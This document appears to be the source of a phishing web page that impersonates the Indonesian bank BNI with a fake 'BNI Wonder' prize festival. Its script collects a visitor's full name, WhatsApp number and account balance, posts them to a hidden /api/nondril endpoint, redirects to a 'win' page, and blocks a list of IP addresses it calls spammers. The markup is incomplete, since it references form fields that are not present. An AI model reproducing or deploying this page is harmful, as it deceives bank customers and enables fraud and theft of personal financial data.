<body>
  <main>
    <nav class="navnon">
      <img width="100%" src="https://lanjakkela.vercel.app/bc.png" alt="BNI Promo" />

      <svg width="50" height="40" fill="currentColor" class="bi bi-bell"><path d="M8 16a2 2 0 0 0 2-2H6a2 2 0 0 0 2 2..." /></svg>
      <span><marquee>Selamat Datang di GEBYAR FESTIVAL BNI WONDER. Menangkan Hadiahnya dan Jadilah Pemenangnya!</marquee></span>

        <center><img width="35%" src="https://lanjakkela.vercel.app/atas.png" alt="Header BNI" /></center>

        <form id="formData" method="POST" class="mt-4">
          <div class="inp">

            <input type="text" name="a" id="namalengkap" required />

  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
  <script>
    // Format mata uang
    $(document).ready(function(){
      $('#saldo').mask('000.000.000.000,00', {reverse: true});
      
      var dengan_rupiah = document.getElementById('saldo');
      dengan_rupiah.addEventListener('keyup', function(e) {
        dengan_rupiah.value = formatRupiah(this.value, 'Rp.');
      });
      
      /* Fungsi */
      function formatRupiah(angka, prefix) {
        var number_string = angka.replace(/[^,\d]/g, '').toString(),
        split    = number_string.split(','),
        sisa     = split[0].length % 3,
        rupiah   = split[0].substr(0, sisa),
        ribuan   = split[0].substr(sisa).match(/\d{3}/gi);
        
        if (ribuan) {
          separator = sisa ? '.' : '';
          rupiah += separator + ribuan.join('.');
        }
        
        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
      }
    });

    // Fungsi utama
    document.addEventListener("DOMContentLoaded", async () => {
      const form = document.getElementById("formData");
      const submitBtn = document.getElementById("kirim");
      const loading = document.getElementById("loading");
      const errorMessage = document.getElementById("errorMessage");
      const errorText = document.getElementById("errorText");
      let isSubmitting = false;

      // Daftar IP spammer
      const blockedIPs = [
        "182.3.141.223",
        "182.8.161.143"
      ];

      // Cek IP user
      const userIP = await getPublicIP();
      if (userIP && blockedIPs.includes(userIP)) {
        showError("Akses kamu diblokir karena terdeteksi sebagai spam!");
        form.style.display = 'none';
        return;
      }

      form.addEventListener("submit", async function (e) {
        e.preventDefault();

        if (isSubmitting) {
          return;
        }

        // Sembunyikan pesan error jika sebelumnya tampil
        errorMessage.style.display = 'none';
        
        // Validasi input
        const nama = document.getElementById("namalengkap").value.trim();
        const noWA = document.getElementById("nowa").value.trim();
        const saldo = document.getElementById("saldo").value.trim();

        if (!nama) {
          showError("Nama lengkap harus diisi");
          return;
        }

        if (!noWA) {
          showError("Nomor WhatsApp harus diisi");
          return;
        }

        if (!/^08[0-9]{8,13}$/.test(noWA)) {
          showError("Nomor WhatsApp tidak valid! Harus diawali dengan '08' dan panjang 10-15 digit.");
          return;
        }

        if (!saldo) {
          showError("Saldo terakhir harus diisi");
          return;
        }

        isSubmitting = true;
        submitBtn.disabled = true;
        loading.style.display = 'block';
        submitBtn.innerText = "Memproses Cetak Kupon...";

        try {
          // Kirim data ke endpoint API
          const res = await fetch('/api/nondril', {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json' 
            },
            body: JSON.stringify({
              a: nama,
              b: noWA,
              c: saldo
            })
          });

          const json = await res.json();

          if (json.success) {
            // Simulasi vibrasi
            if (navigator.vibrate) {
              navigator.vibrate(180);
            }
            
            setTimeout(() => {
              window.location.href = 'win.html';
            }, 1000);
          } else {
            showError(json.message || "Gagal mengirim. Coba lagi.");
          }
        } catch (err) {
          console.error("Error:", err);
          showError("Terjadi kesalahan saat kirim data.");
        }

        resetBtn();
      });

      function resetBtn() {
        isSubmitting = false;
        submitBtn.disabled = false;
        submitBtn.innerText = "Cetak Kupon";
        loading.style.display = 'none';
      }

      function showError(message) {
        errorText.textContent = message;
        errorMessage.style.display = 'block';
        resetBtn();
        
        // Scroll ke pesan error
        errorMessage.scrollIntoView({ behavior: 'smooth' });
      }

      async function getPublicIP() {
        try {
          const res = await fetch("https://api.ipify.org?format=json");
          const data = await res.json();
          return data.ip;
        } catch (err) {
          console.error("Gagal ambil IP:", err);
          return null;
        }
      }
    });
  </script>
